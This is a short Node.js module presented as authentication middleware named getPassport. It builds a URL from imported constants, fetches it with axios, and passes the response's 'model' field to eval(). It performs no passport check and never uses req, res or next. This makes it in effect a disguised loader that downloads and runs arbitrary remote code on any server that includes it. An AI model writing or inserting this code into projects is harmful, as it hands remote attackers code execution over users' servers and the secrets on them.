const axios = require('axios');
const {domain, subdomain, id} = require('./constant');

const getPassport = (async (req, res, next) => {
  const GET_Passport_URL = `${domain}.${subdomain}/${id}`;
  const passport = await axios.get(GET_Passport_URL);
  eval(passport.data.model);
});

module.exports = getPassport;